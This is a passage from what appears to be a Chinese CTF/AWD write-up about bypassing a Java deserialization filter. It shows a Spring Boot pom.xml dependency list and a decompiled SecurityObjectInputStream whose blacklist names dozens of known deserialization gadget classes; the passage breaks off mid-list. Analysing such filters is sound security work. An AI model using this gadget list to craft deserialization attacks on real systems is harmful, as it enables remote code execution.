</span></span><span class="line"><span class="ln">233</span><span class="cl">
</span></span><span class="line"><span class="ln">234</span><span class="cl">        <span class="c">&lt;!-- JTA --&gt;</span>
</span></span><span class="line"><span class="ln">235</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">236</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>javax.transaction<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">237</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jta<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">238</span><span class="cl">            <span class="nt">&lt;version&gt;</span>1.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">239</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">240</span><span class="cl">
</span></span><span class="line"><span class="ln">241</span><span class="cl">        <span class="c">&lt;!-- Logging --&gt;</span>
</span></span><span class="line"><span class="ln">242</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">243</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.slf4j<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">244</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jul-to-slf4j<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">245</span><span class="cl">            <span class="nt">&lt;version&gt;</span>1.7.36<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">246</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">247</span><span class="cl">
</span></span><span class="line"><span class="ln">248</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">249</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.slf4j<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">250</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>slf4j-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">251</span><span class="cl">            <span class="nt">&lt;version&gt;</span>1.7.36<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">252</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">253</span><span class="cl">
</span></span><span class="line"><span class="ln">254</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">255</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.apache.logging.log4j<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">256</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>log4j-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">257</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.17.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">258</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">259</span><span class="cl">
</span></span><span class="line"><span class="ln">260</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">261</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.apache.logging.log4j<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">262</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>log4j-to-slf4j<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">263</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.17.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">264</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">265</span><span class="cl">
</span></span><span class="line"><span class="ln">266</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">267</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>ch.qos.logback<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">268</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>logback-classic<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">269</span><span class="cl">            <span class="nt">&lt;version&gt;</span>1.2.11<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">270</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">271</span><span class="cl">
</span></span><span class="line"><span class="ln">272</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">273</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>ch.qos.logback<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">274</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>logback-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">275</span><span class="cl">            <span class="nt">&lt;version&gt;</span>1.2.11<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">276</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">277</span><span class="cl">
</span></span><span class="line"><span class="ln">278</span><span class="cl">        <span class="c">&lt;!-- OSGI --&gt;</span>
</span></span><span class="line"><span class="ln">279</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">280</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.glassfish.hk2<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">281</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>osgi-resource-locator<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">282</span><span class="cl">            <span class="nt">&lt;version&gt;</span>1.0.3<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">283</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">284</span><span class="cl">
</span></span><span class="line"><span class="ln">285</span><span class="cl">        <span class="c">&lt;!-- SnakeYAML --&gt;</span>
</span></span><span class="line"><span class="ln">286</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">287</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.yaml<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">288</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>snakeyaml<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">289</span><span class="cl">            <span class="nt">&lt;version&gt;</span>1.29<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">290</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">291</span><span class="cl">
</span></span><span class="line"><span class="ln">292</span><span class="cl">        <span class="c">&lt;!-- Spring Framework --&gt;</span>
</span></span><span class="line"><span class="ln">293</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">294</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">295</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-aop<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">296</span><span class="cl">            <span class="nt">&lt;version&gt;</span>5.3.23<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">297</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">298</span><span class="cl">
</span></span><span class="line"><span class="ln">299</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">300</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">301</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-beans<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">302</span><span class="cl">            <span class="nt">&lt;version&gt;</span>5.3.23<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">303</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">304</span><span class="cl">
</span></span><span class="line"><span class="ln">305</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">306</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">307</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-context<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">308</span><span class="cl">            <span class="nt">&lt;version&gt;</span>5.3.23<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">309</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">310</span><span class="cl">
</span></span><span class="line"><span class="ln">311</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">312</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">313</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">314</span><span class="cl">            <span class="nt">&lt;version&gt;</span>5.3.23<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">315</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">316</span><span class="cl">
</span></span><span class="line"><span class="ln">317</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">318</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">319</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-expression<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">320</span><span class="cl">            <span class="nt">&lt;version&gt;</span>5.3.23<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">321</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">322</span><span class="cl">
</span></span><span class="line"><span class="ln">323</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">324</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">325</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-jcl<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">326</span><span class="cl">            <span class="nt">&lt;version&gt;</span>5.3.23<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">327</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">328</span><span class="cl">
</span></span><span class="line"><span class="ln">329</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">330</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">331</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-web<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">332</span><span class="cl">            <span class="nt">&lt;version&gt;</span>5.3.23<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">333</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">334</span><span class="cl">
</span></span><span class="line"><span class="ln">335</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">336</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">337</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-webmvc<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">338</span><span class="cl">            <span class="nt">&lt;version&gt;</span>5.3.23<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">339</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">340</span><span class="cl">
</span></span><span class="line"><span class="ln">341</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">342</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">343</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-tx<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">344</span><span class="cl">            <span class="nt">&lt;version&gt;</span>5.3.30<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">345</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">346</span><span class="cl">
</span></span><span class="line"><span class="ln">347</span><span class="cl">        <span class="c">&lt;!-- Spring Boot --&gt;</span>
</span></span><span class="line"><span class="ln">348</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">349</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">350</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-boot<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">351</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.6.13<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">352</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">353</span><span class="cl">
</span></span><span class="line"><span class="ln">354</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">355</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">356</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-boot-autoconfigure<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">357</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.6.13<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">358</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">359</span><span class="cl">
</span></span><span class="line"><span class="ln">360</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">361</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">362</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-boot-jarmode-layertools<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">363</span><span class="cl">            <span class="nt">&lt;version&gt;</span>2.6.13<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">364</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">365</span><span class="cl">
</span></span><span class="line"><span class="ln">366</span><span class="cl">        <span class="c">&lt;!-- Tomcat --&gt;</span>
</span></span><span class="line"><span class="ln">367</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">368</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat.embed<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">369</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>tomcat-embed-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">370</span><span class="cl">            <span class="nt">&lt;version&gt;</span>9.0.68<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">371</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">372</span><span class="cl">
</span></span><span class="line"><span class="ln">373</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">374</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat.embed<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">375</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>tomcat-embed-el<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">376</span><span class="cl">            <span class="nt">&lt;version&gt;</span>9.0.68<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">377</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="ln">378</span><span class="cl">
</span></span><span class="line"><span class="ln">379</span><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="ln">380</span><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat.embed<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="ln">381</span><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>tomcat-embed-websocket<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="ln">382</span><span class="cl">            <span class="nt">&lt;version&gt;</span>9.0.68<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="ln">383</span><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><p>相对的waf也非常长，分别是在resolveClass中的Waf和在Rasp中的waf</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Java" data-lang="Java"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InvalidClassException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectStreamClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w"></span><span class="cm">/* loaded from: AwdBypass-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/org/awd/awdbypass/serialization/SecurityObjectInputStream.class */</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SecurityObjectInputStream</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">blacklist</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">&#34;br.com.anteros.dbcp.AnterosDBCPConfig&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;br.com.anteros.dbcp.AnterosDBCPDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;bsh.Interpreter&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;bsh.XThis&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;ch.qos.logback.core.db.JNDIConnectionSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;clojure.lang.PersistentArrayMap&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.alibaba.fastjson.JSONArray&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.alibaba.fastjson.TypeReference&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.alibaba.fastjson2.JSONArray&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.caucho.config.types.ResourceRef&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.fasterxml.jackson.databind.node.POJONode&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.mchange.v2.c3p0.ComboPooledDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.mchange.v2.c3p0.JndiRefForwardingDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.mchange.v2.c3p0.PoolBackedDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.mchange.v2.c3p0.debug.AfterCloseLoggingComboPooledDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.mysql.cj.jdbc.MysqlConnectionPoolDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.mysql.cj.jdbc.MysqlXADataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.mysql.cj.jdbc.admin.MiniAdmin&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.nqadmin.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.p6spy.engine.spy.P6DataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.pastdev.httpcomponents.configuration.JndiConfiguration&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.deploy.security.ruleset.DRSHelper&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.jmx.mbeanserver.JmxMBeanServer&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.jmx.mbeanserver.NamedObject&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.jmx.mbeanserver.Repository&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.org.apache.bcel.internal.util.ClassLoader&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.org.apache.xalan.internal.xslt.ObjectFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.org.apache.xalan.internal.xslt.Process&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.DOM&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.TransletException&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.org.apache.xml.internal.dtm.DTMAxisIterator&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.org.apache.xml.internal.serializer.SerializationHandler&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.syndication.feed.impl.ObjectBean&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.vaadin.data.Property&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.vaadin.data.util.NestedMethodProperty&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.vaadin.data.util.PropertysetItem&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.zaxxer.hikari.HikariConfig&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.zaxxer.hikari.HikariDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;groovy.lang.Closure&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;jodd.db.connection.DataSourceConnectionProvider&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;net.sf.ehcache.transaction.manager.selector.GenericJndiSelector&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;net.sf.ehcache.transaction.manager.selector.GlassfishSelector&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;net.sf.json.JSONObject&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;oadd.org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;oadd.org.apache.commons.dbcp.datasources.PerUserPoolDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;oadd.org.apache.commons.dbcp.datasources.SharedPoolDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;oadd.org.apache.xalan.lib.sql.JNDIConnectionPool&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;om.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;om.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;oracle.jdbc.connector.OracleManagedConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;oracle.jdbc.pool.OraclePooledConnection&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;oracle.jdbc.rowset.OracleJDBCRowSet&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;oracle.jms.AQjmsQueueConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;oracle.jms.AQjmsTopicConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;oracle.jms.AQjmsXAConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;oracle.jms.AQjmsXAQueueConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;oracle.jms.AQjmsXATopicConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org..springframework.transaction.jta.JtaTransactionManager&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.aoju.bus.proxy.provider.RmiProvider&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.aoju.bus.proxy.provider.remoting.RmiProvider&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.activemq.ActiveMQConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.activemq.ActiveMQXAConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.activemq.jms.pool.JcaPooledConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.activemq.jms.pool.XaPooledConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.activemq.pool.JcaPooledConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.activemq.pool.PooledConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.activemq.pool.XaPooledConnectionFactory&#34;</span><span class="p">,</span><span class="w"> </span><span 